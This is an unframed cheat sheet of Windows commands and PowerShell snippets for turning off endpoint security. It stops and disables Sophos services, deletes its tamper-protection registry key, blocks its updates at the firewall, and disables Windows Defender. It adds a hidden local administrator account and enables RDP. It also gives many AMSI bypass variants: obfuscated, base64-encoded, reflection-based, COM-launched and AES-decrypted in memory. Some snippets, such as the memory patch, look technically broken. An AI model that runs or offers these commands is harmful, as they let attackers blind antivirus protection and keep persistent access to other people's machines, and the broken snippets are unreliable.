Stop-Service -Name "Sophos Anti-Virus" -Force
Stop-Service -Name "Sophos MCS Client" -Force
Stop-Service -Name "Sophos Web Control Service" -Force

If services restart automatically, disable them:

Set-Service -Name "Sophos Anti-Virus" -StartupType Disabled

taskkill /IM "SophosUI.exe" /F
taskkill /IM "SAVAdminService.exe" /F


Deleting Registry Keys (Disable Tamper Protection Manually)

reg delete "HKLM\SOFTWARE\Sophos\Management\TamperProtection" /f

Network Bypass via Firewall Blocking

New-NetFirewallRule -DisplayName "Block Sophos" -Direction Outbound -Program "C:\Program Files\Sophos\Sophos UI.exe" -Action Block


Or block Sophos servers:
netsh advfirewall firewall add rule name="Block Sophos Updates" dir=out action=block remoteip=52.5.76.199,34.248.93.211

AMSI Bypass to Evade PowerShell Detection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

----------------------------------------
1. Create a Hidden Admin Account
net user pentest P@ssw0rd! /add
net localgroup Administrators pentest /add

Enable RDP for Remote Access
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Disable Windows Defender as a Backup
Set-MpPreference -DisableRealtimeMonitoring $true

AMSI bypass obfuscated in functions

$Amsi = [Ref]."Assem"+"bly".GetType("System.Management.Automation.A"+"msiUt"+"ils")
$Field = $Amsi.GetField('amsiInit'+'Failed', 'NonPublic,Static')
$Field.SetValue($null, $true)


Base64 Encoding & Decoding at Runtime
$encoded = "W1JlZi5Bc3NlbWJseV0uR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCAnTm9uUHVibGljLFN0YXRpYycpLlNldFZhbHVlKCRudWxsLCR0cnVlKQ=="
$bytes = [System.Convert]::FromBase64String($encoded)
[Text.Encoding]::UTF8.GetString($bytes) | Invoke-Expression


Character Substitution & Randomization
$X = [Ref]."Assembly".GetType("System.Management.Automation.AmsiUtils")
$Y = $X.GetField('amsi'+'InitFai'+'led', 'NonPublic,Static')
$Y.SetValue($null, $true)


Using Reflection & Dynamic Invocation
$amsiType = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
$fld = $amsiType.GetField("amsiInitFailed", 'NonPublic,Static')
$method = $fld.GetType().GetMethod("SetValue", [System.Reflection.BindingFlags]::Instance -bor [System.Reflection.BindingFlags]::Public)
$method.Invoke($fld, @($null, $true))


Using Memory Injection to Patch AMSI
$AmsiDll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(
        (New-Object System.Func{IntPtr} {
            [System.Diagnostics.Process]::GetCurrentProcess().Handle
        })
    ), [System.Func{IntPtr}]
).Invoke()

$Patch = [Byte[]] (0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $AmsiDll, 3)


Running the AMSI Bypass via a COM Object
$com = New-Object -ComObject WScript.Shell
$com.Run("powershell -NoP -NonI -W Hidden -Exec Bypass -C `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`")


Encrypting AMSI Bypass & Running It in Memory

$encrypted = "U2FsdGVkX1+JGVnqKxZgqHJJqg=="  # Encrypt the AMSI bypass
$key = (New-Object Security.Cryptography.Rfc2898DeriveBytes("password", 16)).GetBytes(32)
$IV = (1..16) | % {Get-Random -Min 0 -Max 255}
$AES = New-Object Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $IV
$decryptor = $AES.CreateDecryptor()
$bytes = [System.Convert]::FromBase64String($encrypted)
$decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[Text.Encoding]::UTF8.GetString($decrypted) | IEX



